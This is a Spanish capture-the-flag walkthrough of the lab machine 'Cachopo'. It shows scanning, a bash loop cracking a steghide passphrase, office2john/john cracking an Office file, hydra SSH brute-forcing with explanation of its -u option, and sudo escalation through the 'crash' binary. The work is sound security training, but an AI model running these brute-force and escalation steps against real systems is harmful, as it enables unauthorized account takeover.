---
title: aaaaaaaa
date: 2025-11-14
slug: ctf
category: CTF
difficulty: Medium
---
`┌─[root@parrot]─[/home/oscar]
└──╼ #ip a
3: ens36: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:27:66:15 brd ff:ff:ff:ff:ff:ff
    altname enp2s4
    inet 172.18.0.133/24 brd 172.18.0.255 scope global dynamic noprefixroute ens36
       valid_lft 1060sec preferred_lft 1060sec
    inet6 fe80::6996:6b5f:ef66:5b4/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever`

`┌─[root@parrot]─[/home/oscar]
└──╼  #arp-scan -I ens36 --localnet
Interface: ens36, type: EN10MB, MAC: 00:0c:29:27:66:15, IPv4: 172.18.0.133
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.18.0.1	00:50:56:c0:00:08	VMware, Inc.
172.18.0.2	00:50:56:f0:e7:9f	VMware, Inc.
`*`172.18.0.134	00:0c:29:f3:5c:ae	VMware, Inc.`*

`┌─[root@parrot]─[/home/oscar]
└──╼ #cat ports 
#Nmap 7.94SVN scan initiated Sun Aug 11 12:11:47 2024 as: nmap -sSCV -p 22,80 -oN ports 172.18.0.134
Nmap scan report for 172.18.0.134
Host is up (0.00059s latency).`

`PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 b4:ae:d2:8b:a8:30:a5:fb:58:a9:b2:38:73:33:1d:e0 (ECDSA)
|` *` 256 76:21:61:f1:f5:67:8a:95:dc:c1:73:56:16:2e:a4:a5 (ED25519)
80/tcp open  http    Apache httpd 2.4.61
|`*

`┌─[root@parrot]─[/home/oscar]
└──╼ #echo "172.18.0.134 cachopo.thl" | tee -a /etc/hosts
172.18.0.134 cachopo.thl`

Revisamos la ultima linea del fichero, y si la ha añadido.

`┌─[root@parrot]─[/home/oscar]
└──╼ #tail -n 1 /etc/hosts
172.18.0.134 cachopo.thl`

Tras analizar el servidor web, no encontramos *subdominios, directorios, ficheros* nada posiblemente vulnerable, por lo que mirando el código fuente solo nos muestra la imagen como background. Vamos analizar la imagen con steghide

`─[✗]─[root@parrot]─[/home/oscar/Scripts]
└──╼ #steghide --extract -sf /home/oscar/Descargas/cachopo.jpg 
Anotar salvoconducto: 
steghide: No pude extraer ningún dato con ese salvoconducto!`

Necesitamos una contraseña, vamos a pasarle rockyou en bucle hasta que de con ella. Preparamos el siguiente script y las rutas

┌─\[root@parrot]─\[/home/oscar/Scripts]
└──╼ #l
cachopo.sh
┌─\[root@parrot]─\[/home/oscar/Scripts]
└──╼ #l /home/oscar/Descargas/
cachopo.jpg
┌─\[root@parrot]─\[/home/oscar/Scripts]
└──╼ #

```
#!/bin/bash
rockyou="/usr/share/wordlists/rockyou.txt"
jpgfile="/home/oscar/Descargas/cachopo.jpg"
output=""
while IFS= read -r password; do
    output=$(steghide --extract -sf "$jpgfile" -p "$password" 2>&1)
    if [[ $output == *"salvoconducto"* ]]; then
        echo -ne "Probando la contraseña: $password\r"
    else
        echo -e "\n------------------------------------"
        echo -e "\nContraseña encontrada: $password"
        break
    fi
done < "$rockyou"
```

┌─\[✗]─\[root@parrot]─\[/home/oscar/Scripts]
└──╼ #chmod +x cachopot.sh 
┌─\[root@parrot]─\[/home/oscar/Scripts]
└──╼ #./cachopot.sh 
Probando la contraseña: elisazrch
----------------------------------\

*Contraseña encontrada: doggies*
```
┌─\[✗]─\[root@parrot]─\[/home/oscar/Scripts]
└──╼ #steghide --extract -sf /home/oscar/Descargas/cachopo.jpg
Anotar salvoconducto: 
anot� los datos extra�dos e/"directorio.txt".
┌─\[root@parrot]─\[/home/oscar/Scripts]
└──╼ #l
cachopot.sh*  directorio.txt
┌─\[root@parrot]─\[/home/oscar/Scripts]

└──╼ #cat directorio.txt 
```

el directorio es mycachopo

!\[[Pasted image 20240717191918.png]]

┌─\[✗]─\[root@parrot]─\[/home/oscar/Descargas]
└──╼ #file Cocineros 
Cocineros: CDFV2 Encrypt

┌─\[root@parrot]─\[/home/oscar/Descargas]
└──╼ #office2john Cocineros > hash

┌─\[root@parrot]─\[/home/oscar/Descargas]
└──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 \[SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
horse1           (Cocineros)\
1g 0:00:00:07 DONE (2024-08-11 18:58) 0.1422g/s 669.1p/s 669.1c/s 669.1C/s bobcat..alemania
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌─\[root@parrot]─\[/home/oscar/Descargas]
└──╼ #libreoffice Cocineros

!\[[Pasted image 20240811190421.png]]

!\[[Pasted image 20240717195652.png]]

**Hacemos una pausa, y explicamos** 

Es un sistema unix, no está definido por norma que tengan que empezar por minusculas los usuarios, pero SI es conveniente por BLA BLA BLA BLA.

Después, de estar una noche casi entera, dejar una mañana mientras trabajaba los 3 usuarios escaneando... Decidimos lanzar hydra con usuarios normales 

┌─\[oscar@parrot]─\[~/Descargas]
└──╼ $cat usuarios 
sofia
carlos
luis

Sigo con problemas observando que tarda mucho, por lo que decido lanzar hydra en modo debug -d. Pongo un extracto, solo está cogiendo el primer usuario del fichero usuarios.txt *sofia*

\[DEBUG] we will redo the following combination: target 172.18.0.134  child 0  login "sofia"  pass "password1"
\[DEBUG] we will redo the following combination: target 172.18.0.134  child 1  login "sofia"  pass "soccer"
\[DEBUG] we will redo the following combination: target 172.18.0.134  child 2  login "sofia"  pass "butterfly"
\[DEBUG] we will redo the following combination: target 172.18.0.134  child 3  login "sofia"  pass "anthony"
\[DEBUG] we will redo the following combination: target 172.18.0.134  child 4  login "sofia"  pass "jordan"
\[DEBUG] we will redo the following combination: target 172.18.0.134  child 5  login "sofia"  pass "liverpool"
\[DEBUG] we will redo the following combination: target 172.18.0.134  child 6  login "sofia"  pass "friends"
\[DEBUG] we will redo the following combination: target 172.18.0.134  child 7  login "sofia"  pass "purple"
\[DEBUG] we will redo the following combination: target 172.18.0.134  child 9  login "sofia"  pass "justin"
\[DEBUG] we will redo the following combination: target 172.18.0.134  child 10  login "sofia"  pass "angel"
\[DEBUG] we will redo the following combination: target 172.18.0.134  child 11  login "sofia"  pass "lovem"

Hydra va a probar todas las contraseñas que indiquemos en el parametro -p / -P al usuario. Como estamos indicando rockyou, hasta que no finalice, no irá al siguiente.

Aquí tenemos varias opciones:

He probado de lanzar un hydra por cada usuario: *sofia* *carlos* *luis* y ya tenemos el login 

```
┌─[✗]─[root@parrot]─[/home/oscar/Descargas]
└──╼ #hydra -l carlos -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.134   
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 20:11:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.18.0.134:22/
[STATUS] 114.00 tries/min, 114 tries in 00:01h, 14344287 to do in 2097:08h, 14 active

[STATUS] 98.67 tries/min, 296 tries in 00:03h, 14344105 to do in 2422:60h, 14 active
[22][ssh] host: 172.18.0.134   login: carlos   password: bowwow
```

Realizamos un *hydra -help* y nos encontramos con el parametro -u 

```
-u        loop around users, not passwords (effective! implied with -x)
```

## Que es esto?

En Hydra, la opción -u significa loop around users, not passwords (recorrer usuarios en lugar de contraseñas). Esto cambia la forma en que Hydra realiza las pruebas de fuerza bruta.

Sin la opción -u:
Por defecto, Hydra trata de probar todas las contraseñas de una lista para un solo usuario antes de pasar al siguiente usuario. Esto significa que selecciona un usuario, prueba todas las contraseñas de la lista contra ese usuario, y luego pasa al siguiente usuario en la lista.

Con la opción -u:
Cuando usas -u, Hydra cambia el orden de la iteración. En lugar de recorrer todas las contraseñas para un solo usuario antes de pasar al siguiente usuario, recorre los usuarios para una sola contraseña antes de pasar a la siguiente contraseña. Así, selecciona una contraseña y la prueba contra todos los usuarios de la lista antes de pasar a la siguiente contraseña.
Ejemplo:

```
Sin -u:
    usuario1 -> contraseña1
    usuario1 -> contraseña2
    usuario1 -> contraseña3
    usuario1 -> contraseña4
    ...
    usuario2 -> contraseña1
    usuario2 -> contraseña2
    usuario2 -> contraseña3
    usuario2 -> contraseña4
    ...
Con -u:
    usuario1 -> contraseña1
    usuario2 -> contraseña1
    usuario3 -> contraseña1
    usuario4 -> contraseña1
    ...
    usuario1 -> contraseña2
    usuario2 -> contraseña2
    usuario3 -> contraseña2
    usuario4 -> contraseña2
    ...
```

Uso práctico:

Esta opción es útil cuando quieres asegurarte de probar todas las combinaciones de usuarios con una contraseña específica antes de moverte a la siguiente contraseña. Es especialmente efectivo en escenarios donde esperas que una misma contraseña pueda ser válida para varios usuarios. También se activa automáticamente cuando usas el modo de generación automática de combinaciones con -x.
Resumen:

```
-u: Recorre usuarios antes de pasar a la siguiente contraseña.
Sin -u: Recorre todas las contraseñas para un usuario antes de pasar al siguiente usuario.
```

Vamos a ponerlo en modo verbose -v -V  con este nuevo parámetro, haber que hace

```
┌─[✗]─[root@parrot]─[/home/oscar/Descargas/script]
└──╼ #hydra -v -V -u -L usuarios.txt -P /usr/share/wordlists/rockyou.txt 172.18.0.134 ssh -I
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 22:50:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
[DATA] attacking ssh://172.18.0.134:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://sofia@172.18.0.134:22
[INFO] Successful, password authentication is supported by ssh://172.18.0.134:22
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "123456" - 1 of 43033197 [child 0] (0/0)
[ATTEMPT] target 172.18.0.134 - login "carlos" - pass "123456" - 2 of 43033197 [child 1] (0/0)
[ATTEMPT] target 172.18.0.134 - login "luis" - pass "123456" - 3 of 43033197 [child 2] (0/0)
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "12345" - 4 of 43033197 [child 3] (0/0)
[ATTEMPT] target 172.18.0.134 - login "carlos" - pass "12345" - 5 of 43033197 [child 4] (0/0)
[ATTEMPT] target 172.18.0.134 - login "luis" - pass "12345" - 6 of 43033197 [child 5] (0/0)
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "123456789" - 7 of 43033197 [child 6] (0/0)
[ATTEMPT] target 172.18.0.134 - login "carlos" - pass "123456789" - 8 of 43033197 [child 7] (0/0)
[ATTEMPT] target 172.18.0.134 - login "luis" - pass "123456789" - 9 of 43033197 [child 8] (0/0)
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "password" - 10 of 43033197 [child 9] (0/0)
[ATTEMPT] target 172.18.0.134 - login "carlos" - pass "password" - 11 of 43033197 [child 10] (0/0)
[ATTEMPT] target 172.18.0.134 - login "luis" - pass "password" - 12 of 43033197 [child 11] (0/0)
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "iloveyou" - 13 of 43033197 [child 12] (0/0)
[ATTEMPT] target 172.18.0.134 - login "carlos" - pass "iloveyou" - 14 of 43033197 [child 13] (0/0)
[ATTEMPT] target 172.18.0.134 - login "luis" - pass "iloveyou" - 15 of 43033197 [child 14] (0/0)
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "princess" - 16 of 43033197 [child 15] (0/0)
[ATTEMPT] target 172.18.0.134 - login "carlos" - pass "princess" - 17 of 43033198 [child 0] (0/1)
[VERBOSE] Retrying connection for child 0
[ATTEMPT] target 172.18.0.134 - login "luis" - pass "princess" - 18 of 43033198 [child 3] (0/1)
[ATTEMPT] target 172.18.0.134 - login "carlos" - pass "1234567" - 19 of 43033198 [child 9] (0/1)
[VERBOSE] Retrying connection for child 0
[ATTEMPT] target 172.18.0.134 - login "luis" - pass "1234567" - 20 of 43033198 [child 6] (0/1)
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "rockyou" - 21 of 43033198 [child 12] (0/1)
[ATTEMPT] target 172.18.0.134 - login "luis" - pass "rockyou" - 22 of 43033198 [child 15] (0/1)
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "12345678" - 23 of 43033198 [child 5] (0/1)
[ATTEMPT] target 172.18.0.134 - login "carlos" - pass "12345678" - 24 of 43033198 [child 2] (0/1)
[VERBOSE] Retrying connection for child 2
[ATTEMPT] target 172.18.0.134 - login "luis" - pass "12345678" - 25 of 43033198 [child 14] (0/1)
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "abc123" - 26 of 43033198 [child 11] (0/1)
[RE-ATTEMPT] target 172.18.0.134 - login "carlos" - pass "abc123" - 26 of 43033198 [child 2] (0/1)
```

Tiene buena pinta... lo paramos y lo ejecutamos sin verbose.

┌─\[root@parrot]─\[/home/oscar/Descargas/script]
└──╼ #hydra -u -L usuarios.txt -P /usr/share/wordlists/rockyou.txt 172.18.0.134 ssh -I
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 22:50:36
\[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
\[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
\[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
\[DATA] attacking ssh://172.18.0.134:22/
\[STATUS] 299.00 tries/min, 299 tries in 00:01h, 43032899 to do in 2398:43h, 15 active
\[22] host: 172.18.0.134   login: carlos   password: bowwow

Aquí está la contraseña, utilizando un fichero con varios usuarios y otro fichero para las contraseñas. Aqui tenemos muchos amigos "buscadores, videos, foros..." pero uno de los mas importantes, las ayudas oficiales de la herramienta que estamos utilizando.

**Fin de la pausa, seguimos** 

```
Nos conectamos por ssh

└──╼ #ssh carlos@172.18.0.134
The authenticity of host '172.18.0.134 (172.18.0.134)' can't be established.
ED25519 key fingerprint is SHA256:TwxUt/2Cw+RBXmkw35lCwjyjcXY9BpomAJBscsWYUC4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.18.0.134' (ED25519) to the list of known hosts.
carlos@172.18.0.134's password: 
Linux Cachopo 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 11 21:29:23 2024 from 172.18.0.133
carlos@Cachopo:~$ 
```

```
carlos@Cachopo:~$ sudo -l
Matching Defaults entries for carlos on Cachopo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User carlos may run the following commands on Cachopo:
    (ALL) NOPASSWD: /usr/bin/crash
carlos@Cachopo:~$ 
```

https://gtfobins.github.io/gtfobins/crash/

```
carlos@Cachopo:~$ sudo crash -h
```

!\[[Pasted image 20240811231210.png]]

!\[[Pasted image 20240811231955.png]]
